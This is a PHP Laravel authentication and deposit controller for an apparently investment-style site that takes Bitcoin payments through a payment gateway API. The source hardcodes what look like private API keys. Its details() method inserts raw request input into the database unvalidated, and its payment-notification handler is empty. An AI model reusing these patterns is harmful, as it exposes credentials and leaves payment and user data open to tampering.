<?php

namespace App\Http\Controllers;


use Carbon\Carbon;
use App\UserInfo;
use App\User;
use App\Payment;
use Auth;
use App\Deposit;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\View;
use Illuminate\Validation\Rules\In;

class AuthController extends Controller
{
    public function loginIndex() {
//        return View('login');
        return View('errors.working');
    }

    public function registerIndex() {
//        if(Auth::check()) {
//            return Redirect::to('/admin');
//        } else {
//            return View('register');
//        }
        return View('errors.working');
    }

    public function depositIndex() {
//        if(Auth::check()) {
//            return Redirect::to('/admin');
//        } else {
//            return View('deposit');
//        }
        return View('errors.working');
    }

    public function detailsIndex() {
//        return View('details');
        return View('errors.working');
    }


    public function login(Request $request) {
        $userData = array(
            'email' => Input::get('email'),
            'password' => Input::get('password')
        );

        if(Auth::attempt($userData)) {
            return Redirect::to('/admin');
        } else {
            return Redirect::to('/auth/login');
        }
    }

    public function logout(Request $request) {
        Auth::logout();
        Session::flush();
        return Redirect::to('/auth/login');
    }

    public function register(Request $request) {
        $user = new User();

        $user->name = $request->input('fullname');
        $user->email = $request->input('email');
        $user->password = Hash::make($request->input('password'));
        $user->referral = $request->input('referral');

        $user->save();

        $userData = array(
            'email' => Input::get('email'),
            'password' => Input::get('password')
        );

        if(Auth::attempt($userData)) {
            return Redirect::to('/auth/deposit');
        } else {
            return Redirect::to('/auth/login');
        }

    }

    public function deposit(Request $request) {
        $deposit = new Deposit();
        $deposit->plan = $request->input('plan');
        $deposit->payment_method = $request->input('payment_method');
        $deposit->amount = $request->input('amount');
        $deposit->user_id = Auth::user()->id;

        $deposit->save();

        $cps = new Payment();
        $cps->Setup('84Aa2957481111e81cb6D622Fb5CDA0dE95C24285E6b0B5bBcF2aeF4a89e4f5d','b6860d5ed64be6a3b504d6153c5631b83bd6473b2383315b1cc16ab177de2672');

        $amount = $request->input('amount');
        $item = $request->input('plan');
        $payment_method = $request->input('plan');
        $req = array(
            'amount' => $amount,
            'currency1' => 'USD',
            'currency2' => 'BTC',
            'address' => '36rStVawj2f1dQyc2Gq6XBe9yfYgxnuUAF ',
            'item_name' => $item,
            'ipn_url' => 'https://trustukfundgroup.com/notify',
            'ipn_mode' => 'HMAC'
        );



        $result = $cps->CreateTransaction($req);
        if($result['error'] == 'ok') {
            $le = php_sapi_name() == 'cli' ? "\n" : '<br />';
            $txn_id = $result['result']['txn_id'];
            $amt_to_send = sprintf('%.08f', $result['result']['amount']);
            $status_url = $result['result']['status_url'];

            return Redirect::to($status_url);

//            return view('status', ['txn_id' => $txn_id, 'amount' => $amt_to_send, 'status_url' => $status_url]);

//            print 'Transaction created with ID: ' .$result['result']['txn_id'].$le;
//            print 'Buyer should send '.sprintf('%.08f', $result['result']['amount']).'BTC'.$le;
//            print 'Status URL: '.$result['result']['status_url'].$le;
        } else {
            print 'Error: '.$result['error']."\n";
        }
    }

    

    public function details(Request $request) {
        $userinfo = new UserInfo();
        $data = Input::except('_token');
        $data['created_at'] = Carbon::now();
        $data['updated_at'] = Carbon::now();
        $userinfo::insert($data);
        return Redirect::to('/admin');
    }

    public function notify(Request $request) {

    }
}
